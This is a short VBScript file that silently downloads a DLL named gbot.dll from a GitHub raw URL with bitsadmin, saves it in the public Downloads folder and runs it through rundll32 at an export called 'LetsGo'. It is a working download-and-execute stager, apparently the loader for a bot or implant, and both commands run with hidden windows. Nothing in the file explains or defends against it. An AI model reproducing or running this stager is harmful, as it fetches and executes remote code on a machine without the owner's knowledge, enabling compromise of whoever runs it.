Dim objShell
Set objShell = WScript.CreateObject ("WScript.shell")

objShell.run "bitsadmin /NOWRAP /transfer myjob /download /priority high https://raw.githubusercontent.com/fadyosman/Gbot/master/gbot.dll C:\Users\Public\Downloads\gbot.dll", 0, True
objShell.run "rundll32.exe C:\Users\Public\Downloads\gbot.dll,LetsGo", 0, True
Set objShell = Nothing
